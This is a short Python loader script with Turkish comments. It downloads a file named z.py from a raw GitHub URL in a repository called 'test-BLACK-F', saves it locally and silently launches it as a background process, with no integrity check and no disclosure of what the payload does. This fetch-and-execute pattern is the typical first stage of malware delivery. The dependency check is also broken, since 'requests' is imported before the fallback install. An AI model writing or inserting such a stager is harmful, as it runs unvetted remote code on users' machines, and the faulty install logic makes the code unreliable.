import os
import subprocess
import sys
import requests

z_url = "https://raw.githubusercontent.com/New-12/test-BLACK-F/main/test-z.py"  # Burayı GitHub repo linkine göre güncelle

# 1. pip modülleri kontrol & yükle
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

# 2. z.py indir
print("[*] Ana dosya indiriliyor...")
r = requests.get(z_url)
with open("z.py", "w", encoding="utf-8") as f:
    f.write(r.text)
print("[+] z.py indirildi.")

# 3. z.py'yi çalıştır
print("[*] z.py çalıştırılıyor...")
subprocess.Popen([sys.executable, "z.py"])
